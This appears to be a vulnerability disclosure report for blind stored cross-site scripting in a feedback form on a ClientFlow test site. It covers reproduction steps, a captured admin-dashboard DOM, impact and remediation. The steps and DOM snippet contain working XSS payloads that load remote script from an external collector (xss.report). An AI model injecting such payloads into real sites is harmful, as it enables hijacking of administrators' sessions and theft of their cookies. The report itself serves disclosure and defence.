## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Sender Name and Message Fields on ClientFlow Admin Dashboard.

## Affected URL

https://clientflow.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the feedback submission handler of the ClientFlow platform. User-supplied input submitted through feedback fields (such as Name and Feedback message) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When an administrative user reviews submitted feedback items within the admin security awareness dashboard, the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the administrative user's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application submission interface: `https://clientflow.pwnedbox.site/feedback.php`.
2. Locate the feedback submission form and inject JavaScript payloads into input fields (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` into the Name and Feedback message fields).
3. Submit the feedback form.
4. Log into the administrative control panel where stored feedback submissions are reviewed (`https://clientflow.pwnedbox.site/admin/dashboard.php` or equivalent dashboard view).
5. Observe that the stored payload executes in the DOM of the administrative dashboard, firing requests to the external collector (`xss.report`).

## POC
<img width="1513" height="1238" alt="image" src="https://github.com/user-attachments/assets/6e03362c-2adb-4bb9-96e9-2dc12779e82d" />
<img width="1718" height="1270" alt="image" src="https://github.com/user-attachments/assets/637161d3-1063-4f92-bdeb-559d83c7c72a" />


### Vulnerable DOM Snippet

```html
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin Dashboard — ClientFlow</title><link rel="stylesheet" href="../assets/style.css?v=2"></head>
<body><header class="nav"><a class="brand" href="../index.php"><span class="brand-mark">&lt;/&gt;</span> ClientFlow</a><nav><a href="../index.php">Website</a><a href="dashboard.php">Dashboard</a><a href="users.php">Accounts</a><a href="logout.php">Logout</a></nav></header>
<main class="dashboard-wrap"><div class="page-title"><span class="eyebrow">ADMIN CONSOLE</span><h1>Security Awareness Dashboard</h1><p>Review every account and feedback submission captured by the site.</p></div>
<div class="stats"><div class="stat"><span>Total feedback</span><strong>2</strong></div><div class="stat"><span>New feedback</span><strong>2</strong></div><div class="stat"><span>Accounts</span><strong>0</strong></div></div>
<section class="panel"><div class="table-head"><div><h2>Feedback submissions</h2><p class="muted">Latest 100 submissions.</p></div><form class="filters"><input name="q" value="" placeholder="Search name, email, message..."><select name="status"><option value="">All statuses</option><option>new</option><option>reviewed</option><option>resolved</option></select><button class="btn small">Filter</button></form></div>
<div class="table-scroll"><table><thead><tr><th>When</th><th>Sender</th><th>Category</th><th>Message</th><th>Status</th><th>Action</th></tr></thead><tbody>
<tr><td>09 Nov 2026, 06:17</td><td><strong>'"&gt;<script src="https://xss.report/c/vansh"></script></strong><small>asf@gmail.com</small></td><td>Account experience</td><td class="message-cell">'"&gt;<script src="https://xss.report/c/vansh"></script></td><td><span class="status new">new</span></td><td><a class="text-link" href="feedback.php?id=2">View</a></td></tr><tr><td>22 Oct 2026, 06:13</td><td><strong>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></strong><small>hello@gmail.com</small></td><td>General feedback</td><td class="message-cell">'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></td><td><span class="status new">new</span></td><td><a class="text-link" href="feedback.php?id=1">View</a></td></tr></tbody></table></div></section></main><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>

<iframe class="html2canvas-container" width="1718" height="1270" scrolling="no" data-html2canvas-ignore="true" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;"></iframe></body></html>
```

## Impact
Execution of arbitrary JavaScript code within the high-privilege session of an administrator reviewing stored feedback submissions.

Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of feedback statuses or application data.

Persistent code execution affecting backend moderation panels and review workflows.

## Remediation
Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in administrative tables, dashboards, or detail views.

Apply strict input validation and sanitization policies on all feedback submission endpoints (Name, Email, Message fields) to reject or neutralize HTML markup and script tags.

Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
